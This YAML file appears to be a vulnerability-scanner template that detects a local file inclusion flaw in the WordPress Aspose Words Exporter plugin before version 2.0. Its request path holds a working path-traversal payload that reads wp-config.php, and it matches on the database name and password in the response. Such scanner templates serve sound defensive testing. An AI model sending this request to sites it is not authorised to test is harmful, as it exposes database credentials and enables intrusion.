id: "aspose-words-file-download"
name: "WordPress Aspose Words Exporter <2.0 - Local File Inclusion"
severity: "high"
description: "WordPress Aspose Words Exporter prior to version 2.0 is vulnerable to local file inclusion."
tech:
  - "wordpress"
  - "php"
tags:
  - "wordpress"
  - "wp-plugin"
  - "lfi"
  - "aspose"
  - "wpscan"
  - "vuln"
reference: "https://wpscan.com/vulnerability/7869"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "DB_NAME"
      - "DB_PASSWORD"
    condition: "and"
  - type: "status"
    status:
      - 200
